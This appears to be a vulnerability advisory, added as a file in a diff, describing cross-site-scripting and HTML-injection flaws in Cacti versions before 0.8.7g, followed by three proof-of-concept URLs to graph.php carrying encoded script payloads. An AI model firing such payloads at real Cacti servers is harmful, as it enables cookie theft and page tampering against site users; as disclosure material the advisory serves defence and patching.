@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/37109/info
+
+Cacti is prone to multiple cross-site-scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Versions prior to Cacti 0.8.7g are vulnerable. 
+
+
+http://www.example.com/graph.php?action=zoom&local_graph_id=1&graph_end=1%27%20style=visibility:hidden%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cx%20y=%27
+http://www.example.com/graph.php?action=properties&local_graph_id=201&rra_id=0&view_type=tree&graph_start=%3C/pre%3E%3Cscript%3Ealert(4)%3C/script%3E%3Cpre%3E
+http://www.example.com/graph.php?action=properties&local_graph_id=201&rra_id=0&view_type=tree&graph_start=%3C/pre%3E%3Cscript%3Ealert(4)%3C/script%3E%3Cpre%3E
